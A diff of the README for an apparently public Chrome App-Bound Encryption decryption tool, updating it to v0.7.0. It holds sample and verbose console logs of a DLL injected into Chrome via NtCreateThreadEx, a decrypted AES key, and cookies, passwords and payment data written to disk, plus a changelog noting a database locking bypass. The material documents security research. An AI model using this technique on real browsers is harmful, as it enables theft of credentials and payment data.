@@ -39,8 +39,8 @@ These path-validation checks prevent any external tool — even with direct DPAP
 | Browser            | Tested Version (x64 & ARM64) |
 | ------------------ | ---------------------------- |
 | **Google Chrome**  | 136.0.7103.93                |
-| **Brave**          | 1.78.94 (136.0.7103.60)      |
-| **Microsoft Edge** | 136.0.3240.50                |
+| **Brave**          | 1.78.97 (136.0.7103.93)      |
+| **Microsoft Edge** | 136.0.3240.64                |
 
 > [!NOTE]  
 > The injector requires the target browser to be **running** unless you use `--start-browser`.
@@ -119,29 +119,32 @@ PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome
 |  Chrome App-Bound Encryption Decryption      |
 |  Multi-Method Process Injector               |
 |  Cookies / Passwords / Payment Methods       |
-|  v0.6 by @xaitax                             |
+|  v0.7.0 by @xaitax                           |
 ------------------------------------------------
 
 [*] Chrome not running, launching...
-[+] Chrome (v. 136.0.7103.93) launched w/ PID 16768
+[+] Chrome (v. 136.0.7103.93) launched w/ PID 12360
 [+] DLL injected via NtCreateThreadEx stealth
-[*] Starting Chrome App-Bound Encryption Decryption process.
+[*] Waiting for DLL decryption tasks to complete (max 60s)...
+[+] DLL signaled completion.
 
-[+] COM library initialized.
-[+] IElevator instance created successfully.
-[+] Proxy blanket set successfully.
-[+] Local State path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
-[+] Finished Base64 decoding (1224 bytes).
-[+] Key header is valid.
-[+] Encrypted key blob retrieved (1220 bytes).
-[+] Encrypted key retrieved: 01000000d08c9ddf0115d1118c7a00c04fc297eb...
-[+] BSTR allocated for encrypted key.
-[+] Decryption successful.
-[+] Decrypted Key: 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
+[+] COM library initialized (APARTMENTTHREADED).
+[+] IElevator instance created for Chrome.
+[+] Proxy blanket set (PKT_PRIVACY, IMPERSONATE, DYNAMIC_CLOAKING).
+[+] Attempting to read Local State path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
+[+] Finished Base64 decoding with API (1224 bytes).
+[+] Encrypted key header is valid.
+[+] Encrypted key blob from Local State (1220 bytes).
+[+] Encrypted key (preview): 01000000d08c9ddf0115d1118c7a00c0...
+[+] IElevator -> DecryptData successful. Decrypted key length: 32
+[+] Decrypted AES key (hex) saved to: C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
+[+] Decrypted AES Key (hex): 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
 [*] 229 Cookies extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_cookies.txt
 [*] 1 Passwords extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_passwords.txt
-[*] 1 payment methods extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_payments.txt
-[*] Chrome terminated
+[*] 1 Payment methods extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_payments.txt
+[*] Chrome data decryption process finished for Chrome.
+[*] Unloading DLL and exiting worker thread.
+[*] Chrome terminated by injector.
 ```
 
 #### Verbose
@@ -151,56 +154,80 @@ PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome
 ------------------------------------------------
 |  Chrome App-Bound Encryption Decryption      |
 |  Multi-Method Process Injector               |
-|  Full Cookie Decryption                      |
-|  v0.5 by @xaitax                             |
+|  Cookies / Passwords / Payment Methods       |
+|  v0.7.0 by @xaitax                           |
 ------------------------------------------------
 
-[#] verbose=true
-[#] CleanupPreviousRun: removing temp files
+[#] Verbose mode enabled.
+[#] CleanupPreviousRun: attempting to remove temp files
 [#] Deleting C:\Users\ah\AppData\Local\Temp\chrome_decrypt.log
 [#] Deleting C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
-[#] Target display name=Chrome
-[#] procName=chrome.exe, exePath=C:\Program Files\Google\Chrome\Application\chrome.exe
-[#] GetProcessIdByName: snapshotting processes
+[#] HandleGuard: acquired handle 184
+[#] Created completion event: Global\ChromeDecryptWorkDoneEvent
+[#] Target: Chrome, Process: chrome.exe, Default Exe: C:\Program Files\Google\Chrome\Application\chrome.exe
+[#] GetProcessIdByName: snapshotting processes for chrome.exe
+[#] HandleGuard: acquired handle 188
+[#] GetProcessIdByName: Process chrome.exe not found.
+[#] HandleGuard: closing handle 188
 [*] Chrome not running, launching...
-[#] StartBrowserAndWait: exe=C:\Program Files\Google\Chrome\Application\chrome.exe
-[#] Browser started PID=5152
-[#] Retrieving version info
-[#] GetFileVersionInfoSizeW returned size=2212
-[+] Chrome (v. 136.0.7103.49) launched w/ PID 5152
-[#] Opening process PID=5152
-[#] HandleGuard: acquired handle 228
-[#] GetDllPath: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
-[#] InjectWithNtCreateThreadEx: begin
-[#] ntdll.dll base=140707482173440
-[#] NtCreateThreadEx addr=140707482180800
+[#] StartBrowserAndWait: attempting to launch: C:\Program Files\Google\Chrome\Application\chrome.exe
+[#] HandleGuard: acquired handle 220
+[#] HandleGuard: acquired handle 224
+[#] Browser main thread handle: 224
+[#] Browser process handle: 220
+[#] Waiting 3s for browser to initialize...
+[#] Browser started PID=15376
+[#] HandleGuard: closing handle 224
+[#] HandleGuard: closing handle 220
+[#] Retrieving version info for: C:\Program Files\Google\Chrome\Application\chrome.exe
+[#] Version query successful: 136.0.7103.93
+[+] Chrome (v. 136.0.7103.93) launched w/ PID 15376
+[#] Opening process PID=15376
+[#] HandleGuard: acquired handle 220
+[#] IsWow64Process2: processMachine=Unknown, nativeMachine=ARM64, effectiveArch=ARM64
+[#] Architecture match: Injector=ARM64, Target=ARM64
+[#] GetDllPath: DLL path determined as: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
+[#] DLL path: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
+[#] InjectWithNtCreateThreadEx: begin for DLL: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
+[#] ntdll.dll base=140728837603328
+[#] NtCreateThreadEx addr=140728837610688
 [#] VirtualAllocEx size=87
-[#] WriteProcessMemory complete
-[#] Calling NtCreateThreadEx
-[#] NtCreateThreadEx returned 0, thr=248
+[#] WriteProcessMemory complete for DLL path to remote address: 2344395866112
+[#] Calling NtCreateThreadEx with LoadLibraryA at 140728775290080
+[#] HandleGuard: acquired handle 224
+[#] NtCreateThreadEx returned status 0, thread handle=224
+[#] Waiting for remote LoadLibraryA thread (NtCreateThreadEx) to complete (max 15s)...
+[#] Remote LoadLibraryA thread (NtCreateThreadEx) finished.
 [#] InjectWithNtCreateThreadEx: done
+[#] HandleGuard: closing handle 224
 [+] DLL injected via NtCreateThreadEx stealth
-[*] Starting Chrome App-Bound Encryption Decryption process.
-[#] Opening log file C:\Users\ah\AppData\Local\Temp\chrome_decrypt.log
+[*] Waiting for DLL decryption tasks to complete (max 60s)...
+[+] DLL signaled completion.
+[#] Attempting to display log file: C:\Users\ah\AppData\Local\Temp\chrome_decrypt.log
 
-[+] COM library initialized.
-[+] IElevator instance created successfully.
-[+] Proxy blanket set successfully.
-[+] Local State path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
-[+] Finished Base64 decoding (1224 bytes).
-[+] Key header is valid.
-[+] Encrypted key blob retrieved (1220 bytes).
-[+] Encrypted key retrieved: 01000000d08c9ddf0115d1118c7a00c04fc297eb...
-[+] BSTR allocated for encrypted key.
-[+] Decryption successful.
-[+] Decrypted Key: 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
-[*] 114 Cookies extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_cookies.txt
-[#] Terminating browser PID=5152
-[#] HandleGuard: acquired handle 252
-[*] Chrome terminated
-[#] HandleGuard: closing handle 252
-[#] Exiting, success
-[#] HandleGuard: closing handle 228
+[+] COM library initialized (APARTMENTTHREADED).
+[+] IElevator instance created for Chrome.
+[+] Proxy blanket set (PKT_PRIVACY, IMPERSONATE, DYNAMIC_CLOAKING).
+[+] Attempting to read Local State path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
+[+] Finished Base64 decoding with API (1224 bytes).
+[+] Encrypted key header is valid.
+[+] Encrypted key blob from Local State (1220 bytes).
+[+] Encrypted key (preview): 01000000d08c9ddf0115d1118c7a00c0...
+[+] IElevator -> DecryptData successful. Decrypted key length: 32
+[+] Decrypted AES key (hex) saved to: C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
+[+] Decrypted AES Key (hex): 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
+[*] 229 Cookies extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_cookies.txt
+[*] 1 Passwords extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_passwords.txt
+[*] 1 Payment methods extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_payments.txt
+[*] Chrome data decryption process finished for Chrome.
+[*] Unloading DLL and exiting worker thread.
+[#] Terminating browser PID=15376 because injector started it.
+[#] HandleGuard: acquired handle 236
+[*] Chrome terminated by injector.
+[#] HandleGuard: closing handle 236
+[#] Injector finished.
+[#] HandleGuard: closing handle 220
+[#] HandleGuard: closing handle 184
 ```
 
 ## 📂 Data Extraction
@@ -301,6 +328,16 @@ then in hex that’s `0x8009000B`, which corresponds to **NTE_BAD_KEY_STATE** (�
 
 ## 🆕 Changelog
 
+### v0.7
+
+- **New**: Implemented Kernel Named Events for flawless timing between Injector and DLL operations.
+- **Improved**: Major refactoring of both Injector and DLL for enhanced stability, performance, and maintainability.
+- **Improved**: Strict RAII implemented for all system resources (Handles, COM, SQLite) to prevent leaks.
+- **Improved**: More accurate and immediate error code capture and reporting.
+- **Improved**: Adaptive Locking Bypass / Enhanced Locked File Access (SQLite nolock=1 for Login Data/Payment Methods)
+- **Improved**: Dynamic Path Resolution / Dynamic Path Discovery (modern Windows APIs)
+- **Improved**: Optimized DLL's browser termination logic.
+
 ### v0.6
 
 - **New**: Full Username & Password extraction
@@ -324,6 +361,10 @@ Further Links:
 - [Chrome app-bound encryption Service](https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view)
 - [snovvcrash](https://x.com/snovvcrash)
 - [SilentDev33](https://github.com/SilentDev33/ChromeAppBound-key-injection)
+
+## 📜 License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## Disclaimer
 
